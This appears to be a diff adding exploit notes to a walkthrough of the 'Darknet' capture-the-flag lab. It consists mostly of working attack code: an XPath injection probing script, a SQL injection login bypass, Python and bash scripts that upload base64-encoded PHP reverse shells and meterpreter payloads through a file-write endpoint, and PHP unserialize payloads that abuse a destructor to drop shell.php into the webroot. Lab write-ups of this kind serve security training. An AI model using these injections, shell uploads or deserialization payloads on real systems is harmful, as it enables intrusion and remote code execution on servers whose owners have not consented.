@@ -322,3 +322,258 @@ root@kali:~# echo "<?php error_reporting(E_ALL); ini_set('display_errors', 1); i
 
 
 ```
+
+XPATH
+
+```bash
+
+URL="http://signal8.darknet.com/contact.php"
+
+curl -G  --data-urlencode "id=1 $1" $URL 
+
+# ./contact.sh 'and count(/child::node())=1'
+# ./contact.sh 'and count(..)=1'
+# ./contact.sh 'and string-length(email)=22'
+# ./contact.sh 'and substring(email,1,2)="er"'
+# ./contact.sh 'and string-length(name(..))=4' 
+# ./contact.sh 'and substring(name(..),1,1)="a"'
+# ./contact.sh 'and substring(name(..),1,4)="auth"'
+# ./contact.sh 'and string-length(name(//auth))=4'
+# ./contact.sh 'and count(//auth/child::node())=5'
+# ./contact.sh 'and string-length(name(//auth/child::node()[position()=1]))=5'
+# ./contact.sh 'and string-length(name(//auth))=4'
+# 
+
+```
+
+```python
+
+import requests
+import string
+
+session = requests.Session()
+
+
+url = "http://888.darknet.com/"
+
+response = session.get(url)
+cookies = session.cookies.get_dict()
+# print (cookies)
+
+# <input class="textbox" type="text" name="username" placeholder="Usuario" size="18"><br><br>
+# <input class="textbox" type="password" name="password" placeholder="Clave" size="18"><br><br>
+# <input class="textbox" type="submit" name="action" value="Login">
+
+# data = {"username":"%s", "password":"%s", "action":"Login"}
+
+
+# for c in string.punctuation:
+#   d = {"action":"Login"}
+#   d['username'] = c
+#   d['password'] = c
+#   r = session.post(url, data=d, cookies=cookies)
+#   # print(type(r.text))
+
+#   # if "\nFail" in r.text:
+#   #   print('Fail : %s' % c)
+#   if "Ilegal" in r.text:
+#       print('Ilegal : %s' % c)
+
+
+
+data = {"username":"devnull' or '1", "password":"xxxxxxxx", "action":"Login"}
+r = session.post(url, data=data, cookies=cookies)
+url_main  = r.url
+r = requests.get(url_main, cookies=cookies)
+print (r.text)
+# cookies = session.cookies.get_dict()
+# print (cookies)
+
+
+```
+Upload
+
+```python
+
+import requests
+import base64
+
+session = requests.Session()
+
+
+url = "http://888.darknet.com/img/upload.php"
+
+# upload.php
+# <?php
+# error_reporting(E_ALL);
+# ini_set('display_errors', 1);
+# $fp = fopen($_POST['name'], 'wb');
+# fwrite($fp, base64_decode($_POST['content']));
+# fclose($fp);
+# ?>
+
+# php = b"<?php phpinfo(); ?>"
+# php_b64 = base64.b64encode(php).decode()
+# data = {"name":"info.php", "content":php_b64}
+# r = session.post(url, data=data)
+# print (r.text)
+
+
+
+with open('php-reverse-shell.php', 'rb') as f:
+    php = f.read()
+    php_b64 = base64.b64encode(php).decode()
+    data = {"name":"rev.php", "content":php_b64}
+    r = session.post(url, data=data)
+    print (r.text)
+
+# with open('meterpreter.php', 'rb') as f:
+#   php = f.read()
+#   php_b64 = base64.b64encode(php).decode()
+#   data = {"name":"meterpreter.php", "content":php_b64}
+#   r = session.post(url, data=data)
+#   print (r.text)
+
+
+
+```
+
+```bash
+URL="http://888.darknet.com/img/upload.php"
+
+# upload.php
+# <?php
+# error_reporting(E_ALL);
+# ini_set('display_errors', 1);
+# $fp = fopen($_POST['name'], 'wb');
+# fwrite($fp, base64_decode($_POST['content']));
+# fclose($fp);
+# ?>
+
+# $0 : Contient le nom du script tel qu'il a été invoqué
+# $* : L'ensembles des paramètres sous la forme d'un seul argument
+# $@ :  L'ensemble des arguments, un argument par paramètre
+# $# : Le nombre de paramètres passés au script
+# $? : Le code retour de la dernière commande
+# $$ : Le PID su shell qui exécute le script
+# $! : Le PID du dernier processus lancé en arrière-plan
+
+if [ $# -eq 2 ]
+then
+    curl  --data-urlencode "name=$2" --data-urlencode "content=$(base64 $1)" $URL --output -
+else
+    echo "Ex: $0 php-reverse-shell.php abc.php"
+fi
+
+
+
+
+```
+
+
+unserialize
+
+```python
+import requests
+import string
+
+session = requests.Session()
+
+
+url = "http://192.168.110.53/sec.php"
+
+response = session.get(url)
+cookies = session.cookies.get_dict()
+# data = {'test':'O:4:"Show":1:{s:4:"woot";s:4:"ROOT";}'}
+data = {
+  
+    # "test":'O:4:"Test":3:{s:4:"path";s:8:"/var/www";s:9:"name_file";s:15:"meterpreter.php";s:3:"url";s:45:"/home/devnull/public_html/img/meterpreter.php";}'
+    "test" : 'O:4:"Test":3:{s:3:"url";s:45:"/home/devnull/public_html/img/meterpreter.php";s:9:"name_file";s:9:"shell.php";s:4:"path";s:8:"/var/www";}'
+  
+    }
+
+
+r = session.post(url, data=data, cookies=cookies)
+print (r.text)
+# cookies = session.cookies.get_dict()
+# print (cookies)
+
+
+```
+```bash
+
+curl --data-urlencode 'test=O:4:"Test":3:{s:3:"url";s:45:"/home/devnull/public_html/img/meterpreter.php";s:9:"name_file";s:5:"s.php";s:4:"path";s:8:"/var/www";}' http://192.168.110.53/sec.php
+```
+
+
+```php
+
+<?php
+
+require "Classes/Test.php";
+require "Classes/Show.php";
+
+if(!empty($_POST['test'])){
+    $d=$_POST['test'];
+    $j=unserialize($d);
+    echo $j;
+}
+echo $j;
+
+
+/*
+$t = new Test;
+
+$t->url = "php-reverse-shell.php";
+$t->name_file = "shell.php";
+$t->path = "./";
+
+$a = serialize($t);
+var_dump($a);
+
+$d = 'O:4:"Test":3:{s:3:"url";s:21:"php-reverse-shell.php";s:9:"name_file";s:9:"shell.php";s:4:"path";s:2:"./";}';
+$j=unserialize($d);
+
+$j=unserialize($a);
+var_dump($j);
+
+*/
+
+?>
+
+```
+
+```php
+<?php
+
+class Test {
+
+    public $url;
+    public $name_file;
+    public $path;
+
+
+    function __construct() {
+        print "In constructor\n";
+    }
+
+   
+    function __destruct(){
+        echo $this->url;
+        echo $this->path;
+        echo $this->name_file;
+        $data=file_get_contents($this->url);
+        $f=fopen($this->path."/".$this->name_file, "w");
+        fwrite($f, $data);
+        fclose($f);
+        chmod($this->path."/".$this->name_file, 0644);
+    }
+
+}
+
+?>
+
+
+```
+
+
